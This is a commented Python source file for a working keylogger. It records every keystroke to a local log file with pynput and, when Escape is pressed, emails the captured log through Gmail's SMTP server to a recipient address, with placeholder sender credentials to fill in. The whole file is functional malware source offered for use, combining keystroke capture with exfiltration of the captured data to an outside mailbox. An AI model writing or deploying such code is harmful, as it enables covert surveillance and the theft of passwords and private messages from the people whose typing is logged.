# pynput.keyboard is used to control and monitor the keyboard
# Key provides predefined constants for special keys
# Listener listens for keyboard events
from pynput.keyboard import Key, Listener
# Library that will log the key strokes into a file
import logging
# Import necessary modules for sending emails
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Configures the logging settings.
# The log messages will be saved in a file named keylog.txt
# All messages of level DEBUG and above will be recorded
# The format of the log messages will include the timestamp and the log message itself
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

# Email credentials and recipient information
sender_email = "youremail@gmail.com"  # Replace with your email
sender_password = "yourpassword"  # Replace with your email password or app password
recipient_email = "recipientemail@gmail.com"  # Replace with the recipient's email

# Function to send the log file as an email
def send_email():
    # Open the keylog.txt file and read its contents
    with open("keylog.txt", "r") as f:
        log_content = f.read()

        # Prepare the email content
    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = recipient_email
    msg["Subject"] = "Keylogger Logs"
    msg.attach(MIMEText(log_content, "plain"))

    # Try to send the email
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:  # Using Gmail's SMTP server
            server.starttls()  # Upgrade the connection to secure
            server.login(sender_email, sender_password)  # Login with email credentials
            server.sendmail(sender_email, recipient_email, msg.as_string())  # Send the email
            print("Email sent successfully.")
    except Exception as e:
        print(f"Error sending email: {e}")  # Handle any errors that occur during email sending

# Function triggered every time a key is pressed
def on_press(key):
    # Converts the key object into a string and logs it to the file using the INFO level
    logging.info(str(key))

    # If the Escape key is pressed, stop the listener and send the email
    if key == Key.esc:
        send_email()  # Send the email with the logged keystrokes
        return False  # Returning False stops the listener

# Starts a listener instance to monitor key presses
# Specifies the callback function to call whenever a key is pressed
with Listener(on_press=on_press) as listener:
    # Keeps the program running and the listener active
    listener.join()
